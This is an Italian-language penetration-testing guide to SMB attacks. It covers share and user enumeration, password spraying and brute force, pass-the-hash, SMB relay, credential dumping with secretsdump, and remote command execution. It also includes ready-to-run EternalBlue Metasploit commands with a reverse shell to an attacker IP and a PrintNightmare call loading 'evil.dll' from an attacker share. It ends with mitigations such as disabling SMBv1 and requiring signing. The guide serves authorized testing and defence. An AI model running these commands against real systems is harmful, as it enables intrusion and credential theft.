# SMB - Server Message Block Attacks

## Scopo

Questa guida copre le vulnerabilità e le tecniche di attacco relative al protocollo SMB (Server Message Block), utilizzato per la condivisione di file e risorse in ambienti Windows. Include enumerazione, exploitation e mitigazioni.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- smbclient, enum4linux, crackmapexec
- Metasploit Framework (per exploit)
- **Autorizzazione scritta** per i test
- Conoscenza di Windows networking

## Installazione

```bash
# Strumenti principali
sudo apt-get update
sudo apt-get install smbclient enum4linux crackmapexec smbmap
```

---

## Porte e Versioni

| Porta | Servizio | Note |
|-------|----------|------|
| 139 | NetBIOS Session | SMB over NetBIOS |
| 445 | SMB Direct | SMB over TCP |

| Versione | Windows | Note |
|----------|---------|------|
| SMBv1 | XP, 2003 | Deprecato, vulnerabile |
| SMBv2 | Vista, 2008 | Migliorato |
| SMBv2.1 | 7, 2008 R2 | Lease locking |
| SMBv3 | 8, 2012+ | Encryption, compression |

---

## Enumerazione

### Nmap

```bash
# Scansione SMB
nmap -p 139,445 --script smb-enum-shares,smb-enum-users target

# Vulnerabilità SMB
nmap -p 445 --script smb-vuln* target

# Versione SMB
nmap -p 445 --script smb-protocols target

# OS detection via SMB
nmap -p 445 --script smb-os-discovery target
```

### SMBClient

```bash
# Lista share (null session)
smbclient -L //target -N

# Connessione a share
smbclient //target/share -U username

# Con dominio
smbclient //target/share -U 'DOMAIN\username'

# Comandi interattivi
smb: \> ls
smb: \> cd directory
smb: \> get file.txt
smb: \> put local.txt
smb: \> recurse ON
smb: \> mget *
```

### SMBMap

```bash
# Enumerazione share e permessi
smbmap -H target

# Con credenziali
smbmap -H target -u user -p password

# Lista file ricorsiva
smbmap -H target -u user -p password -R share

# Download file
smbmap -H target -u user -p password --download 'share\file.txt'

# Esecuzione comando
smbmap -H target -u user -p password -x 'whoami'
```

### CrackMapExec

```bash
# Enumerazione base
crackmapexec smb target

# Test credenziali
crackmapexec smb target -u user -p password

# Password spraying
crackmapexec smb target -u users.txt -p 'Password123'

# Enumerazione share
crackmapexec smb target -u user -p password --shares

# Enumerazione utenti
crackmapexec smb target -u user -p password --users

# Dump SAM (admin required)
crackmapexec smb target -u admin -p password --sam
```

### Enum4linux

```bash
# Enumerazione completa
enum4linux -a target

# Solo utenti
enum4linux -U target

# Solo share
enum4linux -S target

# RID cycling
enum4linux -r target
```

---

## Vulnerabilità Note

### EternalBlue (MS17-010)

```bash
# Verifica vulnerabilità
nmap -p 445 --script smb-vuln-ms17-010 target

# Exploit con Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

### SMBGhost (CVE-2020-0796)

```bash
# Verifica
nmap -p 445 --script smb-vuln-cve-2020-0796 target

# Oppure scanner specifico
python3 scanner.py target
```

### PrintNightmare (CVE-2021-1675)

```bash
# Exploit
python3 CVE-2021-1675.py 'domain/user:password@target' '\\attacker\share\evil.dll'
```

---

## Attacchi

### Null Session

```bash
# Test null session
rpcclient -U "" -N target

rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> querydominfo
```

### Brute Force

```bash
# Con hydra
hydra -L users.txt -P passwords.txt smb://target

# Con crackmapexec
crackmapexec smb target -u users.txt -p passwords.txt
```

### Pass the Hash

```bash
# Con smbclient
smbclient //target/share -U user --pw-nt-hash NTLM_HASH

# Con crackmapexec
crackmapexec smb target -u user -H NTLM_HASH

# Con psexec
impacket-psexec -hashes :NTLM_HASH user@target
```

### SMB Relay

```bash
# Trova target senza SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Avvia relay
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## Post-Exploitation

### Esecuzione Comandi

```bash
# PsExec
impacket-psexec domain/user:password@target

# WMIExec
impacket-wmiexec domain/user:password@target

# SMBExec
impacket-smbexec domain/user:password@target
```

### Dump Credenziali

```bash
# Dump SAM (richiede admin)
impacket-secretsdump domain/user:password@target

# Solo NTDS (Domain Controller)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Mitigazioni

### Disabilitare SMBv1

```powershell
# Windows Server
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Via GPO
# Computer Configuration > Administrative Templates > Network > 
# Lanman Workstation > Enable insecure guest logons = Disabled
```

### SMB Signing

```powershell
# Abilita signing obbligatorio
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true
```

### Firewall

```powershell
# Blocca SMB dall'esterno
New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -Profile Public
```

### Patch Management

- Applica patch Microsoft regolarmente
- Priorità a patch SMB critiche
- Test prima del deploy in produzione

---

## Best Practices

- **Disabilita SMBv1**: Rimuovi completamente il protocollo legacy
- **SMB Signing**: Richiedi sempre la firma dei pacchetti
- **Patch**: Mantieni i sistemi aggiornati
- **Segmentazione**: Limita l'accesso SMB tra VLAN
- **Monitoring**: Monitora accessi SMB anomali
- **Least privilege**: Limita permessi sulle share

## Riferimenti

- [Microsoft SMB Documentation](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)
- [MITRE ATT&CK - SMB](https://attack.mitre.org/techniques/T1021/002/)
